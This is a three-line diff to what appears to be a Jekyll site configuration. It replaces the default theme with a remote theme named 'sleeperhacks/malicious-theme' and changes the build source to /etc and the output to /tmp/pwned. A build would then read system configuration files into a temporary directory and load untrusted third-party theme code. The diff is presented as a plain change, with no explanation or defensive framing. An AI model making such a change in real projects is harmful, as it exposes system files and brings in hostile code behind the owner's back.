@@ -1,3 +1,5 @@
+remote_theme: sleeperhacks/malicious-theme
 plugins:
   - jekyll-remote-theme
-theme: jekyll-theme-primer
+source: /etc
+destination: /tmp/pwned
